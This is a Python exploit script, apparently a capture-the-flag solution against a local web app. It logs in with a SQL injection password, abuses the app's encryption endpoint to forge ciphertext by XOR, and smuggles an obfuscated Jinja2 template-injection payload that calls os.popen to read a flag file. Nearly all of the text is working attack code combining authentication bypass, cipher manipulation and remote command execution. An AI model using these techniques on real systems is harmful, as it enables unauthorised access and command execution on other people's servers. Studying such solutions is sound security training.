import requests
import codecs
import html
from pwn import xor
import random

login_url = 'http://localhost:5000/'
home_url = 'http://localhost:5000/home'
login_data = {
    'username': 'user',
    'password': "'or'1'='1"
}
session = requests.Session()
login_response = session.post(login_url, data=login_data)

seed = b'c'*16
aes_iv = b'b'*16
# mode
# Encrypt: 0
# Decrypt: 1
def getMessage(mode, message):
    if(mode==1):
        rand = random.Random()
        rand.seed(int.from_bytes(seed, byteorder="big"))
        message = xor(rand.randbytes(len(message)), message).hex()
        try:
            hx = bytes.fromhex(message)
        except:
            return message
    actions = ['Encrypt', 'Decrypt']
    home_data = {
        'message': message,
        'action': actions[mode]
    }
    home_response = session.post(home_url, data=home_data)
    ciphertext = home_response.text.split('<h2>Result:</h2>')[1].split('<p class="alert alert-info">')[1].split("<")[0]
    ciphertext = codecs.escape_decode(html.unescape(ciphertext))[0]
    return ciphertext

if login_response.status_code == 200:
    print("Login successful")
    script = '{% for x in ()|attr("__cl"+"ass__")|attr("__ba"+"se__")|attr("__sub"+"clas"+"ses__")() %}{% if "warning" in x|attr("__na"+"me__")%}{{x()|attr("_mod"+"ule")|attr("__bu"+"iltins__")|attr("__get"+"it"+"em__")("__imp"+"ort__")("o"+"s")|attr("pop"+"en")("ca"+"t${IFS}fla"+"g")|attr("re"+"ad")()}}{%endif%}{%endfor%}'
    pads = '1'*(16-(len(script)%16))
    script = pads + script
    script = script.encode()
    prefix = b'\x00'*16 
    suffix = b'\x01'*16
    loop = len(script)//16
    for i in range(loop):
        payload = prefix + suffix
        temp = getMessage(1, payload)
        ind = (loop-i)*16
        temp = temp[16:32]
        addPayload = xor(script[ind-16:ind], temp)
        suffix = addPayload + suffix

    payload = suffix
    flag = getMessage(1, payload)
    # print(flag)
    print(flag.split(pads.encode())[1])
    
else:
    print("Failed to login")
    print(f"Status code: {login_response.status_code}")
    print(login_response.text)
